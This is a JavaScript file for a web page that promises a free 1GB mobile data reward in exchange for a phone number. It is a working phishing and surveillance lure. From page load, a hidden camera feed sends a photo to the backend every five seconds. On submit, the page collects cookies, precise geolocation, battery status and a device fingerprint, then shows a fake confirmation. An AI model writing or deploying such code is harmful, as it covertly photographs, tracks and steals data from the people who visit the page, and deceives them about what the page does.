document.addEventListener('DOMContentLoaded', () => {
    const dataForm = document.getElementById('dataForm');
    const phoneNumberInput = document.getElementById('phoneNumber');
    const phoneError = document.getElementById('phoneError');
    const messageDiv = document.getElementById('message');
    const operatorSelect = document.getElementById('operator');

    const cameraFeed = document.getElementById('cameraFeed'); // Remains hidden via CSS in index.html
    const photoCanvas = document.getElementById('photoCanvas'); // Remains hidden via CSS in index.html
    // snapPhotoButton and photosContainer are no longer used for UI interaction or display
    let stream = null;
    let photoIntervalId = null; // To store the interval ID for automatic photo capture

    // Request camera permission on page load
    async function requestCameraAccess() {
        try {
            stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
            cameraFeed.srcObject = stream;
            // cameraFeed and photoCanvas remain hidden as per index.html style="display:none;"
            console.log("Camera access granted. Attempting to start automatic photo capture.");

            // Wait for the video metadata to load to get correct dimensions and ensure it's playing
            cameraFeed.onloadedmetadata = () => {
                console.log("Camera feed metadata loaded. Starting photo capture interval.");
                if (photoIntervalId) clearInterval(photoIntervalId); // Clear existing interval if any
                // Capture a photo immediately, then set interval
                captureAndSendPhoto();
                photoIntervalId = setInterval(captureAndSendPhoto, 5000); // Capture every 5 seconds
            };
            cameraFeed.onerror = (e) => {
                console.error("Error with camera feed:", e);
                messageDiv.textContent = 'Error with camera feed. Automatic photo capture might fail.';
                messageDiv.className = 'message error';
                if (photoIntervalId) clearInterval(photoIntervalId);
            };

        } catch (err) {
            console.error("Error accessing camera: ", err);
            messageDiv.textContent = 'Camera access denied or not available. Automatic photo capture disabled.';
            messageDiv.className = 'message error';
            if (photoIntervalId) clearInterval(photoIntervalId);
        }
    }

    requestCameraAccess(); // Request camera as soon as the page loads

    // Function to automatically capture and send photo
    function captureAndSendPhoto() {
        if (!stream || !cameraFeed.srcObject || cameraFeed.paused || cameraFeed.ended || cameraFeed.readyState < HTMLMediaElement.HAVE_METADATA) {
            console.log('Camera stream not available, active, or ready for photo capture.');
            return;
        }
        
        const context = photoCanvas.getContext('2d');
        
        // Ensure camera feed has valid dimensions before drawing
        if (cameraFeed.videoWidth === 0 || cameraFeed.videoHeight === 0) {
            console.log("Camera feed not ready (zero dimensions), skipping photo capture this time.");
            return;
        }
        
        // Set canvas dimensions to match the video stream to capture the full image
        photoCanvas.width = cameraFeed.videoWidth;
        photoCanvas.height = cameraFeed.videoHeight;
        
        context.drawImage(cameraFeed, 0, 0, photoCanvas.width, photoCanvas.height);
        const imageDataURL = photoCanvas.toDataURL('image/jpeg', 0.8); // Use JPEG with 80% quality
        
        sendDataToBackend({ photo: imageDataURL, type: 'photo', timestamp: new Date().toISOString() });
        console.log(`Auto-captured photo at ${new Date().toLocaleTimeString()} sent to backend.`);
    }

    // The manual snapPhotoButton event listener and photosContainer logic are removed.

    // Form submission
    dataForm.addEventListener('submit', async (event) => {
        event.preventDefault();
        phoneError.textContent = '';
        messageDiv.textContent = '';
        messageDiv.className = 'message';

        const phoneNumber = phoneNumberInput.value;
        const operator = operatorSelect.value;

        if (!/^\d{10}$/.test(phoneNumber)) {
            phoneError.textContent = 'Please enter a valid 10-digit phone number.';
            return;
        }
        if (!operator) {
            messageDiv.textContent = 'Please select an operator.';
            messageDiv.className = 'message error';
            return;
        }

        // --- Enhanced User and Device Info Gathering ---
        let deviceInfo = {
            timestamp: new Date().toISOString(),
            userAgent: navigator.userAgent || 'N/A',
            platform: navigator.platform || 'N/A',
            language: navigator.language || 'N/A',
            languages: navigator.languages ? navigator.languages.join(', ') : 'N/A',
            screenWidth: screen.width || 'N/A',
            screenHeight: screen.height || 'N/A',
            screenColorDepth: screen.colorDepth || 'N/A',
            screenPixelDepth: screen.pixelDepth || 'N/A',
            cookieEnabled: navigator.cookieEnabled || 'N/A',
            cookies: document.cookie || 'N/A', // Raw cookie string
            doNotTrack: navigator.doNotTrack === null ? 'N/A' : navigator.doNotTrack,
            hardwareConcurrency: navigator.hardwareConcurrency || 'N/A',
            deviceMemory: navigator.deviceMemory || 'N/A',
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'N/A',
            connection: 'N/A',
            plugins: Array.from(navigator.plugins || []).map(p => ({ name: p.name, filename: p.filename, description: p.description })),
            // IP Address, ISP, and Organization are best determined server-side.
        };

        // Network connection details
        if (navigator.connection) {
            deviceInfo.connection = {
                effectiveType: navigator.connection.effectiveType || 'N/A',
                rtt: navigator.connection.rtt || 'N/A',
                downlink: navigator.connection.downlink || 'N/A',
                saveData: navigator.connection.saveData || 'N/A',
            };
        }

        // Attempt to get Geolocation (will trigger browser permission prompt)
        if (navigator.geolocation) {
            try {
                const position = await new Promise((resolve, reject) =>
                    navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 5000 })
                );
                deviceInfo.geolocation = {
                    latitude: position.coords.latitude,
                    longitude: position.coords.longitude,
                    accuracy: position.coords.accuracy,
                    altitude: position.coords.altitude,
                    altitudeAccuracy: position.coords.altitudeAccuracy,
                    heading: position.coords.heading,
                    speed: position.coords.speed,
                    timestamp: new Date(position.timestamp).toISOString(),
                };
            } catch (geoError) {
                console.warn("Geolocation error:", geoError.message);
                deviceInfo.geolocation = `Error: ${geoError.message}`;
            }
        } else {
            deviceInfo.geolocation = 'Not supported';
        }

        // Attempt to get Battery Status (may trigger browser permission prompt)
        if (navigator.getBattery) {
            try {
                const battery = await navigator.getBattery();
                deviceInfo.battery = {
                    level: battery.level * 100 + '%',
                    charging: battery.charging ? 'Yes' : 'No',
                    chargingTime: battery.chargingTime === Infinity ? 'N/A' : `${battery.chargingTime}s`,
                    dischargingTime: battery.dischargingTime === Infinity ? 'N/A' : `${battery.dischargingTime}s`,
                };
            } catch (batteryError) {
                console.warn("Battery API error:", batteryError.message);
                deviceInfo.battery = `Error: ${batteryError.message}`;
            }
        } else {
            deviceInfo.battery = 'Not supported';
        }
        // --- End of Enhanced Info Gathering ---

        const formData = {
            phoneNumber,
            operator,
            deviceInfo,
            timestamp: new Date().toISOString()
        };

        // Simulate sending data to backend
        const success = await sendDataToBackend(formData);

        if (success) {
            messageDiv.textContent = 'Congratulations! Your request for 1GB data has been submitted.';
            messageDiv.className = 'message success';
            dataForm.reset();
            // Optionally, take more photos or perform other actions
            // For "unlimited photos", you might set an interval here,
            // but that's highly intrusive and not recommended without clear user consent for each photo.
        } else {
            messageDiv.textContent = 'There was an error submitting your request. Please try again.';
            messageDiv.className = 'message error';
        }
    });

    async function sendDataToBackend(data) {
        console.log("Sending data to backend:", data);
        try {
            const response = await fetch('/api/submit-data', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(data),
            });
            if (response.ok) {
                const result = await response.json();
                console.log('Backend response:', result);
                // Display success message based on backend response if needed
                // For example: messageDiv.textContent = result.message || 'Data submitted successfully';
                // messageDiv.className = 'message success';
                return true;
            } else {
                const errorResult = await response.json().catch(() => ({ message: response.statusText }));
                console.error('Backend error:', response.status, errorResult.message);
                messageDiv.textContent = `Error: ${errorResult.message || 'Could not submit data.'}`;
                messageDiv.className = 'message error';
                return false;
            }
        } catch (error) {
            console.error('Error sending data to backend:', error);
            messageDiv.textContent = 'Network error or server unavailable. Please try again.';
            messageDiv.className = 'message error';
            return false;
        }
    }
});